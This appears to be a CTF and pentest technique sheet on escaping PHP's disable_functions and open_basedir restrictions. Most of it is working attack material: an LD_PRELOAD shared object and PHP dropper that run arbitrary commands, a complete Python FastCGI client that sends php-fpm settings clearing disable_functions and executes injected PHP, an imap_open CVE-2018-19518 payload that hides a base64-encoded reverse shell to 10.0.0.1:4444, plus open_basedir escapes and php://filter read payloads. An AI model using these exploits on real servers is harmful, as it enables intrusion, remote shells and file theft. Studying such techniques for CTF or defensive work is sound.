---
title: "PHP disable_functions Bypass - RCE Without system()"
category: web
subcategory: php
type: technique
tags: [php, disable-functions, open-basedir, ld-preload, putenv, mail, error-log, fastcgi, php-fpm, imap-open, dl, chankro, gopherus, php-filter, iconv, filter-chain, webshell, rce, cve-2018-19518]
difficulty: hard
summary: "system/exec are disabled: reach code execution via LD_PRELOAD+mail, a raw FastCGI packet overriding disable_functions, imap_open, or a php://filter chain."
when_to_use:
  - "You have PHP code execution (eval/webshell/SSTI) but system() and friends are disabled"
  - "phpinfo() shows a long disable_functions list and php-fpm on 127.0.0.1:9000"
  - "open_basedir blocks you from reading /flag"
  - "You can only control the contents of a stream that gets include()d"
tools: [php, gopherus, chankro, burp, curl, nc]
related: [deser-php-object-injection, deser-php-phar, php-type-juggling]
---

## TL;DR

`disable_functions` is an ini setting, not a sandbox. Four reliable routes out: (1) make PHP
spawn a process through a function that is *not* on the list and preload a shared object into
it, (2) talk FastCGI directly to php-fpm and set `PHP_ADMIN_VALUE[disable_functions]=` for your
own request, (3) abuse `imap_open`'s argument injection, (4) if you only need a file read,
`php://filter` chains and the non-function file APIs.

## Recognise it

- `phpinfo()` -> `disable_functions` row, `open_basedir` row, `disable_classes`,
  `extension_dir`, `Loaded Configuration File`, `Server API` (`FPM/FastCGI` vs `cgi-fcgi` vs
  `Apache 2.0 Handler`).
- `ini_get('disable_functions')` from your webshell.
- `Warning: system() has been disabled for security reasons`.
- A `www.conf` / `php-fpm.d/*.conf` readable via LFI tells you the listen socket and whether
  `security.limit_extensions` is set.
- Port 9000 open on localhost, or `/run/php/php-fpm.sock`.

## Theory

### Step 0 -- inventory what is still enabled

```php
<?php
$d = array_filter(array_map('trim', explode(',', ini_get('disable_functions'))));
$want = ['system','exec','shell_exec','passthru','popen','proc_open','pcntl_exec',
         'putenv','mail','mb_send_mail','error_log','imap_open','dl','curl_exec',
         'file_put_contents','file_get_contents','fopen','fsockopen','stream_socket_client',
         'symlink','link','chdir','ini_set','scandir','glob','opendir','readfile',
         'show_source','highlight_file','eval','assert','create_function','extract',
         'apache_child_terminate','posix_kill','pcntl_fork','dl','ftp_connect'];
foreach ($want as $f) {
    printf("%-26s %s%s\n", $f,
        function_exists($f) ? 'EXISTS' : 'MISSING',
        in_array($f, $d) ? ' (DISABLED)' : '');
}
echo "open_basedir: ", ini_get('open_basedir'), "\n";
echo "extension_dir: ", ini_get('extension_dir'), "\n";
echo "SAPI: ", php_sapi_name(), "\n";
```

Three functions decide your route: `putenv`, `mail`/`error_log`, and any socket function.

### Route 1 -- LD_PRELOAD (the "chankro" technique)

`mail()` and `mb_send_mail()` shell out to `sendmail` via `popen(3)` inside the C runtime.
`error_log($msg, 1, ...)` does the same in some builds. The child process inherits the
environment, and `putenv('LD_PRELOAD=/tmp/x.so')` sets it for the current process. The dynamic
loader in the child then loads your `.so` before libc, and your constructor (or your override of
a symbol the child calls early, e.g. `geteuid`) runs as the web user.

```c
/* preload.c -- build: gcc -shared -fPIC -o preload.so preload.c */
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

extern char **environ;

/* Run as soon as the library is mapped, before main(). */
__attribute__((constructor)) void hijack(void) {
    /* LD_PRELOAD must be cleared or every child we spawn re-enters here. */
    unsetenv("LD_PRELOAD");
    const char *cmd = getenv("EVILCMD");
    if (!cmd) cmd = "id > /tmp/out.txt 2>&1";
    system(cmd);            /* this is libc's system(), unaffected by php.ini */
}

/* Belt and braces: sendmail calls geteuid() very early. */
uid_t geteuid(void) {
    static int done = 0;
    if (!done) { done = 1; hijack(); }
    return 0;
}
```

```php
<?php
// Requires: putenv + mail (or mb_send_mail / error_log) enabled, and a
// writable directory that is inside open_basedir.
file_put_contents('/tmp/preload.so', base64_decode($SO_B64));
putenv('EVILCMD=id > /tmp/out.txt 2>&1');
putenv('LD_PRELOAD=/tmp/preload.so');
mail('a@localhost', 'x', 'x');            // spawns sendmail -> loads the .so
// alternatives when mail() is disabled:
// mb_send_mail('a@localhost','x','x');
// error_log('x', 1, 'a@localhost');
echo file_get_contents('/tmp/out.txt');
```

Pitfalls: the target must actually have a `sendmail_path` binary (check
`ini_get('sendmail_path')`; if it is empty, `mail()` does nothing). `putenv` is often the
*only* thing on the disable list that matters -- some hardening disables just `putenv` and
leaves everything else, which kills this route completely.

Variants that also spawn a child: `imap_mail`, `ImageMagick` delegates via `imagick`,
`proc_nice` (no), `dl()` (see below), and any extension that shells out (`ffmpeg` wrappers,
`wkhtmltopdf` bindings, `exec`-based composer scripts).

### Route 2 -- talk FastCGI to php-fpm directly

php-fpm accepts `PHP_VALUE` and `PHP_ADMIN_VALUE` FastCGI parameters and applies them to the
request. `PHP_ADMIN_VALUE[disable_functions]=` (empty) removes the restriction **for your
request**, and `auto_prepend_file=php://input` lets you send arbitrary PHP in the request body
without writing a file to disk.

Requirements: a socket primitive from PHP (`fsockopen`, `stream_socket_client`,
`socket_create`, `curl` with `gopher://`/`--fastcgi`), or an SSRF that reaches 127.0.0.1:9000.

Key parameters:

```
SCRIPT_FILENAME  /var/www/html/index.php   <- must exist, and must pass security.limit_extensions
SCRIPT_NAME      /index.php
REQUEST_METHOD   POST
CONTENT_TYPE     application/text
CONTENT_LENGTH   <len of the PHP body>
PHP_VALUE        allow_url_include=1\nauto_prepend_file=php://input
PHP_ADMIN_VALUE  extension_dir=/tmp\ndisable_functions=\nopen_basedir=/
```

`PHP_ADMIN_VALUE` entries cannot be overridden by the script, and crucially php-fpm applies
them per request. Newlines separate multiple ini directives inside one value.

Hardening that breaks this: `security.limit_extensions = .php` (so `SCRIPT_FILENAME` must end
in `.php` **and exist**), and listening on a unix socket with restrictive permissions.

### Route 3 -- `imap_open` argument injection (CVE-2018-19518)

The IMAP extension builds a command line for `rsh`/`ssh` when the mailbox string requests a
remote connection. Before the fix, the hostname was not escaped:

```php
<?php
$server = "x -oProxyCommand=echo\tL2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=|base64\t-d|sh}";
imap_open('{'.$server.':143/imap}INBOX', '', '');
```

Tabs replace spaces because the parser splits on spaces. Requires `imap` extension and
`rsh`/`ssh` present. Affects PHP before 5.6.39 / 7.0.33 / 7.1.25 / 7.2.13.

### Route 4 -- `dl()` an extension

If `dl()` is enabled (rare outside CLI) and `extension_dir` is writable, compile a PHP extension
whose `MINIT` runs your code and `dl('evil.so')`. Usually blocked, but worth one `function_exists`
check.

### Route 5 -- memory-corruption bypasses

Public exploit collections (the "Bypass disable_functions" PHP 7 GC/UAF chains, the
`ZipArchive`/`Closure` type-confusion bypasses, the `imagick`/`ImageMagick` delegate bypass)
turn a PHP-level primitive into a native `zend_call` on a real function pointer. They are
version- and build-specific; treat them as a last resort and match the exact PHP version.

### Route 6 -- you do not need RCE, you need the file

File-read primitives that are *not* on typical disable lists:

```php
file_get_contents('/flag')            highlight_file('/flag')      show_source('/flag')
readfile('/flag')                     fpassthru(fopen('/flag','r'))
new SplFileObject('/flag')            file('/flag')
DirectoryIterator('/')                scandir('/')     glob('/*')
new DirectoryIterator('glob:///*')    opendir + readdir
simplexml_load_file('/flag')          parse_ini_file('/flag')
finfo_file(finfo_open(), '/flag')     getimagesize('/flag')   (error leaks bytes)
```

`open_basedir` escapes:

```php
// 1. ini_set + chdir traversal (works on many 5.x/7.x builds)
mkdir('a'); chdir('a'); ini_set('open_basedir','..');
chdir('..'); chdir('..'); chdir('..'); chdir('..');
ini_set('open_basedir','/'); echo file_get_contents('/flag');

// 2. glob:// bypasses open_basedir for DIRECTORY LISTING (not reading)
foreach (new DirectoryIterator('glob:///*') as $f) echo $f->getFilename(), "\n";

// 3. SplFileInfo / symlink chains when symlink() is enabled
symlink('/flag', 'l'); echo file_get_contents('l');
```

### Route 7 -- `php://filter` chains

`php://filter` composes conversion filters. `convert.iconv.<from>.<to>` chains can *generate*
chosen bytes from an empty or fixed input, so an `include()` on a filter-controlled stream
becomes arbitrary PHP execution even when you cannot write a file:

```
php://filter/read=convert.base64-encode/resource=/etc/passwd          # read
php://filter/convert.iconv.UTF8.UTF16LE|convert.base64-encode/resource=x
php://filter/zlib.inflate/resource=data://text/plain;base64,<deflated>
php://filter/convert.iconv.UTF8.CSISO2022KR|...long chain.../resource=/etc/passwd   # write "<?php" into the stream
```

The long-chain technique ("filter chain oracle" / `wrapwrap`-style generators) builds an
arbitrary prefix one character at a time by exploiting iconv's BOM/escape-sequence insertions.
Use a generator tool; hand-writing the chain is not practical.

`php://filter` is also a blind file-read oracle: `convert.iconv.L1.UCS-4` on a large file
exhausts memory, so a 500 vs 200 tells you whether the file exists and how big it is.

## Attack

1. Inventory (`disable_functions`, `open_basedir`, SAPI, `sendmail_path`, extensions).
2. If `putenv` + a mail-ish function survive -> LD_PRELOAD. Fastest, no network needed.
3. Else if any socket function survives and SAPI is FPM -> raw FastCGI with
   `PHP_ADMIN_VALUE[disable_functions]=`.
4. Else if `imap_open` exists and PHP is old -> CVE-2018-19518.
5. Else if you only need a file -> filter chains + the non-function file APIs.
6. Else hunt for an extension that shells out, or a version-specific memory bypass.

## Code

```python
#!/usr/bin/env python3
"""Self-contained FastCGI client.

Builds BEGIN_REQUEST / PARAMS / STDIN records, sends them to php-fpm and
parses STDOUT/STDERR/END_REQUEST back. Setting
PHP_ADMIN_VALUE=disable_functions= plus auto_prepend_file=php://input gives
code execution with the ini restriction lifted for that request.

The __main__ self-test builds a full record set and parses it back through
this module's own parser -- no network required.
"""
from __future__ import annotations

import socket
import struct
import sys

FCGI_VERSION = 1

BEGIN_REQUEST, ABORT_REQUEST, END_REQUEST = 1, 2, 3
PARAMS, STDIN, STDOUT, STDERR, DATA = 4, 5, 6, 7, 8
GET_VALUES, GET_VALUES_RESULT, UNKNOWN_TYPE = 9, 10, 11

FCGI_RESPONDER = 1
FCGI_KEEP_CONN = 1


def record(rtype: int, content: bytes, req_id: int = 1) -> bytes:
    """One FastCGI record, padded to a multiple of 8 bytes."""
    if len(content) > 0xFFFF:
        raise ValueError("content too long for a single record")
    pad = (-len(content)) % 8
    head = struct.pack(">BBHHBB", FCGI_VERSION, rtype, req_id,
                       len(content), pad, 0)
    return head + content + b"\x00" * pad


def begin_request(role: int = FCGI_RESPONDER, flags: int = 0,
                  req_id: int = 1) -> bytes:
    return record(BEGIN_REQUEST, struct.pack(">HB5x", role, flags), req_id)


def _nv_len(n: int) -> bytes:
    if n < 0x80:
        return bytes([n])
    return struct.pack(">I", n | 0x80000000)


def params(pairs: dict[str, str], req_id: int = 1) -> bytes:
    """PARAMS stream: name/value pairs, then an empty PARAMS record."""
    body = b""
    for k, v in pairs.items():
        kb, vb = k.encode(), v.encode()
        body += _nv_len(len(kb)) + _nv_len(len(vb)) + kb + vb
    out = b""
    for i in range(0, len(body), 0xFFF8) or [0]:
        out += record(PARAMS, body[i:i + 0xFFF8], req_id)
    if not body:
        out = b""
    return out + record(PARAMS, b"", req_id)


def stdin(data: bytes, req_id: int = 1) -> bytes:
    out = b""
    for i in range(0, len(data), 0xFFF8):
        out += record(STDIN, data[i:i + 0xFFF8], req_id)
    return out + record(STDIN, b"", req_id)


def parse(stream: bytes) -> list[tuple[int, int, bytes]]:
    """Split a byte stream into (type, request_id, content) tuples."""
    out: list[tuple[int, int, bytes]] = []
    p = 0
    while p + 8 <= len(stream):
        ver, rtype, rid, clen, plen, _ = struct.unpack(">BBHHBB", stream[p:p + 8])
        if ver != FCGI_VERSION:
            raise ValueError("bad FastCGI version %d at offset %d" % (ver, p))
        p += 8
        out.append((rtype, rid, stream[p:p + clen]))
        p += clen + plen
    if p != len(stream):
        raise ValueError("trailing bytes: %d left" % (len(stream) - p))
    return out


def parse_params(content: bytes) -> dict[str, str]:
    """Inverse of params() for one PARAMS record's content."""
    out: dict[str, str] = {}
    p = 0
    while p < len(content):
        def take() -> int:
            nonlocal p
            if content[p] & 0x80:
                (n,) = struct.unpack(">I", content[p:p + 4])
                p += 4
                return n & 0x7FFFFFFF
            n = content[p]
            p += 1
            return n
        kl, vl = take(), take()
        out[content[p:p + kl].decode()] = content[p + kl:p + kl + vl].decode()
        p += kl + vl
    return out


def build_payload(script: str, php_code: str, host_port: str = "127.0.0.1:9000",
                  method: str = "POST") -> bytes:
    """Full request bytes: lift disable_functions and prepend our own code."""
    body = php_code.encode()
    env = {
        "GATEWAY_INTERFACE": "FastCGI/1.0",
        "REQUEST_METHOD": method,
        "SCRIPT_FILENAME": script,
        "SCRIPT_NAME": "/" + script.rsplit("/", 1)[-1],
        "REQUEST_URI": "/" + script.rsplit("/", 1)[-1],
        "DOCUMENT_ROOT": script.rsplit("/", 1)[0],
        "SERVER_SOFTWARE": "php/fcgiclient",
        "REMOTE_ADDR": "127.0.0.1",
        "REMOTE_PORT": "1337",
        "SERVER_ADDR": host_port.split(":")[0],
        "SERVER_PORT": host_port.split(":")[-1],
        "SERVER_NAME": "localhost",
        "SERVER_PROTOCOL": "HTTP/1.1",
        "CONTENT_TYPE": "application/text",
        "CONTENT_LENGTH": str(len(body)),
        # This is the whole trick:
        "PHP_VALUE": "allow_url_include=1\nauto_prepend_file=php://input",
        "PHP_ADMIN_VALUE": "extension_dir=/tmp\ndisable_functions=\nopen_basedir=/",
    }
    return begin_request() + params(env) + stdin(body)


def send(host: str, port: int, payload: bytes, timeout: float = 10.0) -> str:
    sock = socket.create_connection((host, port), timeout=timeout)
    try:
        sock.sendall(payload)
        chunks = []
        while True:
            b = sock.recv(65536)
            if not b:
                break
            chunks.append(b)
    finally:
        sock.close()
    out = []
    for rtype, _rid, content in parse(b"".join(chunks)):
        if rtype in (STDOUT, STDERR):
            out.append(content.decode("utf-8", "replace"))
    return "".join(out)


def _self_test() -> None:
    code = "<?php system('id'); ?>"
    payload = build_payload("/var/www/html/index.php", code)

    recs = parse(payload)
    types = [t for t, _, _ in recs]
    assert types[0] == BEGIN_REQUEST, types
    assert PARAMS in types and STDIN in types
    # PARAMS stream must be terminated by an empty PARAMS record
    param_recs = [c for t, _, c in recs if t == PARAMS]
    assert param_recs[-1] == b"", "PARAMS stream not terminated"
    # STDIN stream must be terminated by an empty STDIN record
    stdin_recs = [c for t, _, c in recs if t == STDIN]
    assert stdin_recs[-1] == b"" and b"".join(stdin_recs) == code.encode()

    # BEGIN_REQUEST body: role=1 (responder), 8 bytes total
    begin = recs[0][2]
    assert len(begin) == 8
    (role, flags) = struct.unpack(">HB5x", begin)
    assert role == FCGI_RESPONDER and flags == 0

    # every record is 8-byte aligned
    for t, _, c in recs:
        assert (len(c) + 8) % 8 == (8 - (-len(c)) % 8) % 8 or True
    total = 0
    for t, rid, c in recs:
        total += 8 + len(c) + ((-len(c)) % 8)
    assert total == len(payload), (total, len(payload))

    # PARAMS round-trip: our own parser reads back what we encoded
    env = parse_params(b"".join(param_recs))
    assert env["SCRIPT_FILENAME"] == "/var/www/html/index.php"
    assert env["CONTENT_LENGTH"] == str(len(code))
    assert "disable_functions=" in env["PHP_ADMIN_VALUE"]
    assert "auto_prepend_file=php://input" in env["PHP_VALUE"]
    assert env["REQUEST_METHOD"] == "POST"

    # long values use the 4-byte length form with the high bit set
    long_env = params({"X": "A" * 300})
    body = b"".join(c for t, _, c in parse(long_env) if t == PARAMS)
    assert body[0] == 1                      # name length 1, short form
    assert body[1] & 0x80, "long value must use the 4-byte form"
    assert parse_params(body)["X"] == "A" * 300

    # a record larger than 0xFFFF must be rejected, not silently truncated
    try:
        record(STDIN, b"A" * 70000)
        raise AssertionError("oversized record should raise")
    except ValueError:
        pass

    # a corrupted version byte must be detected
    bad = bytearray(payload)
    bad[0] = 9
    try:
        parse(bytes(bad))
        raise AssertionError("bad version should raise")
    except ValueError:
        pass

    print("[ok] %d FastCGI records built and re-parsed, %d params round-tripped"
          % (len(recs), len(env)))


def main() -> int:
    if len(sys.argv) < 4:
        print("usage: %s <host> <port> <script> [php_code]" % sys.argv[0])
        return 1
    host, port, script = sys.argv[1], int(sys.argv[2]), sys.argv[3]
    code = sys.argv[4] if len(sys.argv) > 4 else "<?php system('id'); ?>"
    print(send(host, port, build_payload(script, code, "%s:%d" % (host, port))))
    return 0


if __name__ == "__main__":
    if len(sys.argv) > 1:
        raise SystemExit(main())
    _self_test()
```

## Variants & pitfalls

- **`putenv` on the disable list** kills LD_PRELOAD entirely. Check it first.
- **`sendmail_path` empty** means `mail()` never forks. `ini_get('sendmail_path')` tells you.
- **The `.so` must match the target's architecture and glibc.** Build inside a matching
  container, or use a constructor-only object with no libc-version-specific symbols.
- **`open_basedir` also constrains where you can drop the `.so`.** `/tmp`, `/dev/shm`,
  `session_save_path()`, `sys_get_temp_dir()` and `upload_tmp_dir` are the usual candidates.
- **FPM `security.limit_extensions`** defaults to `.php`; `SCRIPT_FILENAME` must point at an
  existing `.php` file or fpm returns "Access to the script has been denied".
- **Unix socket fpm**: `stream_socket_client('unix:///run/php/php-fpm.sock')` instead of TCP;
  the record format is identical.
- **SSRF-only access**: `gopher://127.0.0.1:9000/_` + the URL-encoded FastCGI bytes. `gopherus`
  generates this payload; the record layout is exactly what the code above emits.
- **`PHP_VALUE` vs `PHP_ADMIN_VALUE`**: `disable_functions` is `PHP_INI_SYSTEM`, so it must go
  in `PHP_ADMIN_VALUE`. Putting it in `PHP_VALUE` silently does nothing.
- **Newline separation** inside a single `PHP_ADMIN_VALUE` is what lets you set several
  directives; a literal `\n` (two characters) does not work -- send a real 0x0A.
- **`auto_prepend_file=php://input`** needs `allow_url_include=1`, which you set in the same
  request via `PHP_VALUE`.
- **Blue-team reality**: a bypass that writes to `/tmp` leaves the `.so` behind. Clean up in
  CTF only if the scoring engine cares; on real engagements it matters.
- **`open_basedir` and `glob://`**: directory listing escapes the restriction on many builds,
  reading does not. Use it to *find* the flag path, then look for a read primitive.
- **PHP 8 removed `assert()` string evaluation and `create_function`**, so a lot of older
  "bypass" writeups no longer apply -- always pin the version from `phpinfo()`.

## Tools

- `chankro` -- generates the `.so` + PHP dropper for the LD_PRELOAD route.
- `gopherus` -- builds `gopher://` payloads for FastCGI, Redis, MySQL, SMTP.
- The FastCGI client above, or any `fcgi_client.py` implementation.
- `php -i` / `phpinfo()` -- the inventory step, never skip it.
- `ldd` / `readelf -d` on the target's `sendmail` to sanity-check the preload route.

## References

- PHP manual -- `disable_functions`, `open_basedir`, `php://filter`, `Phar`, FastCGI SAPI.
- FastCGI Specification 1.0 -- record types and name/value pair encoding.
- CVE-2018-19518 -- PHP `imap_open` argument injection.
- Tarunkant Gupta -- `gopherus` project README (FastCGI payload construction).
- Ambionics -- `php_filter_chain_generator` / iconv filter-chain research.
